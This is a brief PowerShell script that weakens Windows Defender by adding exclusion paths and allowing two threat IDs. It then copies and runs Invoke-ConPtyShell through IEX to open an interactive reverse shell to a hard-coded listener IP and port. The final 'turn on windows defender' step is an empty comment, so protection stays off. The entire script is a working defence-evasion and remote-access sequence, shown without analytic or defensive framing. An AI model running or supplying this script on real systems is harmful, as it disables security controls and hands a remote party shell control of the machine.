#connection variables:
$ListenerIP = "172.20.103.158"
$ListenerPort = "35500"

#threats to be allowed
$threat1 = "2147773719"
$threat2 = "2147780248"

#add Windows Defender Exclusions:
$TempExcl = "C:\Users\$($env:UserName)\AppData\Local\Temp"
    Add-MpPreference -ExclusionPath C:\Windows\Setup\State, C:\Windows\Setup\State\Setup.ps1, C:\Windows\Setup\State\Invoke-ConPtyShell.ps1, $TempExcl

#add allowed threats
Add-MpPreference -ThreatIDDefaultAction_Ids $threat1 -ThreatIDDefaultAction_Actions Allow -Force
Add-MpPreference -ThreatIDDefaultAction_Ids $threat2 -ThreatIDDefaultAction_Actions Allow -Force

#copy connection script:
Copy-Item -Path Z:\Invoke-ConPtyShell.ps1 -Destination C:\Windows\Setup\State\Invoke-ConPtyShell.ps1

#run connection script:
IEX(IWR C:\Windows\Setup\State\Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $ListenerIP $ListenerPort

#turn on windows defender:
